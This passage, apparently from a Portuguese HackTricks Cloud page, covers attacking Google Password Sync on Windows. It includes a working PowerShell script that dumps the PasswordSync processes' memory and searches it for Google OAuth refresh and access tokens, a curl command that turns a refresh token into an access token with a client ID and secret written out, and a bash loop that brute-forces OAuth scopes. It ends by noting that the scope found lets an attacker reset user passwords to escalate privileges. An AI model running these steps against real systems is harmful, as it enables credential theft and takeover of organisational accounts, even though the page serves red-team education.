Os valores de entropia foram encontrados usando a ferramenta. Ela foi configurada para monitorar as chamadas para **`CryptUnprotectData`** e **`CryptProtectData`** e, em seguida, a ferramenta foi usada para iniciar e monitorar `PasswordSync.exe`, que descriptografar√° a senha e o token de autentica√ß√£o configurados no in√≠cio, e a ferramenta **mostrar√° os valores da entropia usada** em ambos os casos:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Observe que tamb√©m √© poss√≠vel ver os valores **descriptografados** na entrada ou sa√≠da das chamadas para essas APIs tamb√©m (caso em algum momento o Winpeas pare de funcionar).

Caso a Sincroniza√ß√£o de Senhas tenha sido **configurada com credenciais de SA**, tamb√©m ser√° armazenada em chaves dentro do registro **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Extraindo tokens da mem√≥ria

Assim como com o GCPW, √© poss√≠vel extrair a mem√≥ria do processo dos processos `PasswordSync.exe` e `password_sync_service.exe` e voc√™ poder√° encontrar tokens de atualiza√ß√£o e acesso (se j√° tiverem sido gerados).\
Acho que voc√™ tamb√©m poderia encontrar as credenciais do AD configuradas.

<details>

<summary>Extrair <code>PasswordSync.exe</code> e os processos <code>password_sync_service.exe</code> e buscar tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Gerando tokens de acesso a partir de tokens de atualiza√ß√£o

Usando o token de atualiza√ß√£o, √© poss√≠vel gerar tokens de acesso utilizando-o e o ID do cliente e o segredo do cliente especificados no seguinte comando:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Escopos

{% hint style="info" %}
Observe que, mesmo tendo um token de atualiza√ß√£o, n√£o √© poss√≠vel solicitar nenhum escopo para o token de acesso, pois voc√™ s√≥ pode solicitar os **escopos suportados pela aplica√ß√£o onde voc√™ est√° gerando o token de acesso**.

Al√©m disso, o token de atualiza√ß√£o n√£o √© v√°lido em todas as aplica√ß√µes.
{% endhint %}

Por padr√£o, o GPS n√£o ter√° acesso como o usu√°rio a todos os poss√≠veis escopos OAuth, ent√£o, usando o seguinte script, podemos encontrar os escopos que podem ser usados com o `refresh_token` para gerar um `access_token`:

<details>

<summary>Script Bash para for√ßa bruta de escopos</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

E este √© o resultado que obtive no momento da escrita:
```
https://www.googleapis.com/auth/admin.directory.user
```
Que √© o mesmo que voc√™ obt√©m se n√£o indicar nenhum escopo.

{% hint style="danger" %}
Com este escopo voc√™ poderia **modificar a senha de um usu√°rio existente para escalar privil√©gios**.
{% endhint %}

## Refer√™ncias

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
